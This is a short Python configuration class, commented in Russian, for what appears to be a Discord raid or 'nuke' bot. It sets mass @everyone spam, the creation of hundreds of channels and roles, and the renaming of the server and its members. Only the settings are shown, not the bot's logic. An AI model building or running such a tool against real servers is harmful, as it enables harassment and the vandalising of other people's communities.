class Settings:
    SpamAmount = 30 #количество спам сообщений в каждый чат
    SpamText = "@everyone\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🦣" # спам текст в каждый канал
    TextChannelName = "🦣🦣🦣" #название создаваемых каналов без пробелов и заглавных букв
    VoiceChannelName = "🦣🦣🦣" #название голосовых каналов
    ChannelTopic = "🦣🦣🦣"
    ActivityText = "🦣" #текст в активности бота
    ActivityURL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"  # ссылка на видео в активности
    AvatarFileName = "avatar.png" #файл с аватарков включая расширение файла
    UsersName = "🦣" #меняет имена участникам
    ServerName = "🦣🦣🦣" #меняет название сервера
    RolesName = "🦣🦣🦣🦣" #название ролей
    ChannelsAmount = 100 #количество каналов плюс голосовые число умножается на два
    RolesAmount = 500 #количество ролей
    token = "" #токен бота